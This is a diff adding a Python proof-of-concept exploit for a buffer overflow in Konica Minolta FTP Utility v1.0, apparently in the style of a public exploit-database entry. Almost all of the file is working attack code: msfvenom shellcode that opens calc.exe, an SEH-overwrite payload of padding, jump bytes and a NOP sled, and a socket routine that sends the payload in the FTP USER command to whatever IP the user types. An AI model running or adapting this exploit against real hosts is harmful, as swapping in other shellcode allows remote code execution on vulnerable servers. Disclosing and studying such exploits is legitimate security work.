@@ -1,0 +1,46 @@
+# Title: Konica Minolta FTP Utility - Remote Command Execution
+# Date : 20/09/2015
+# Author: R-73eN
+# Software: Konica Minolta FTP Utility v1.0
+# Tested: Windows XP SP3 
+# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
+# Every command is vulnerable to buffer overflow.
+
+import socket
+import struct
+
+shellcode =  ""#msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0d\x0a\x3d\x5c\x2f"
+shellcode += "\xbd\xfe\xbd\x27\xc9\xda\xd8\xd9\x74\x24\xf4\x5e\x29"
+shellcode += "\xc9\xb1\x31\x31\x6e\x13\x83\xee\xfc\x03\x6e\xf1\x5f"
+shellcode += "\xd2\x35\xe5\x22\x1d\xc6\xf5\x42\x97\x23\xc4\x42\xc3"
+shellcode += "\x20\x76\x73\x87\x65\x7a\xf8\xc5\x9d\x09\x8c\xc1\x92"
+shellcode += "\xba\x3b\x34\x9c\x3b\x17\x04\xbf\xbf\x6a\x59\x1f\xfe"
+shellcode += "\xa4\xac\x5e\xc7\xd9\x5d\x32\x90\x96\xf0\xa3\x95\xe3"
+shellcode += "\xc8\x48\xe5\xe2\x48\xac\xbd\x05\x78\x63\xb6\x5f\x5a"
+shellcode += "\x85\x1b\xd4\xd3\x9d\x78\xd1\xaa\x16\x4a\xad\x2c\xff"
+shellcode += "\x83\x4e\x82\x3e\x2c\xbd\xda\x07\x8a\x5e\xa9\x71\xe9"
+shellcode += "\xe3\xaa\x45\x90\x3f\x3e\x5e\x32\xcb\x98\xba\xc3\x18"
+shellcode += "\x7e\x48\xcf\xd5\xf4\x16\xd3\xe8\xd9\x2c\xef\x61\xdc"
+shellcode += "\xe2\x66\x31\xfb\x26\x23\xe1\x62\x7e\x89\x44\x9a\x60"
+shellcode += "\x72\x38\x3e\xea\x9e\x2d\x33\xb1\xf4\xb0\xc1\xcf\xba"
+shellcode += "\xb3\xd9\xcf\xea\xdb\xe8\x44\x65\x9b\xf4\x8e\xc2\x53"
+shellcode += "\xbf\x93\x62\xfc\x66\x46\x37\x61\x99\xbc\x7b\x9c\x1a"
+shellcode += "\x35\x03\x5b\x02\x3c\x06\x27\x84\xac\x7a\x38\x61\xd3"
+shellcode += "\x29\x39\xa0\xb0\xac\xa9\x28\x19\x4b\x4a\xca\x65"
+banner = ""
+banner +="  ___        __        ____                 _    _  \n"  
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+nSEH = "\xEB\x13\x90\x90"
+SEH = struct.pack('<L',0x1220401E)
+evil = "A" * 8343 + nSEH + SEH + "\x90" * 22 + shellcode +"D" * (950 - len(shellcode))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server = raw_input('Enter IP : ')
+s.connect((server, 21))
+a = s.recv(1024)
+print ' [+] ' + a
+s.send('User ' + evil )
+print '[+] https://www.infogen.al/ [+]'
